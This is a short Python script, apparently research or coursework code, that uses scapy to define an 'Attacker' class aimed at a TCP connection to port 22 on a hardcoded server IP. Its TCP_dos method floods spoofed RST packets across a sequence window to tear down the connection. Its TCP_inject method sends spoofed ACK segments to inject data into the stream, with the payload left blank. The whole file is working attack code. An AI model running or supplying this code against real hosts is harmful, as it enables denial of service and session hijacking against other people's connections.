#!/usr/bin/python
from scapy.all import *
class Attacker:

    def __init__(self, client_ip='192.168.43.127', server_ip='124.70.155.59', client_port=65535, 
                 server_port=22, ack_in_window=0, seq_next=0, seq_in_window=0, seq_window_size=65535, 
                 send_if_name=['wlan0']):
        self.client_ip = client_ip
        self.client_port = client_port
        self.server_ip = server_ip
        self.server_port = server_port
        self.ack_in_window = ack_in_window
        self.seq_next = seq_next
        self.seq_in_window = seq_in_window
        self.seq_window_size = seq_window_size
        self.send_if_name = send_if_name

    def TCP_dos(self):
        print('^.^.^ Attack the TCP connection, reset the TCP connection ^.^.^')
        send_list = []

        for i in range(self.seq_window_size):
            sq = self.seq_in_window - i
            send_list.append(IP(src=self.server_ip, dst=self.client_ip) /
                             TCP(sport=self.server_port, dport=self.client_port, seq=sq, flags='R'))
        
        send(send_list, iface=self.send_if_name, verbose=False)

        return
    
    def TCP_inject(self):
        print('^.^.^ inject data into TCP connection ^.^.^')
        send_list = []

        ##### The TCP payload needs to be modified according to the data format of the target TCP connection #####
        payload = " " 
        
        for i in range(5):
            send_list.append(IP(src=self.server_ip, dst=self.client_ip) /
                                    TCP(sport=self.server_port, dport=self.client_port, seq=self.seq_next,
                                        ack=self.ack_in_window - i, flags='A') / payload)

        send(send_list, iface=self.send_if_name, verbose=False)

        return
    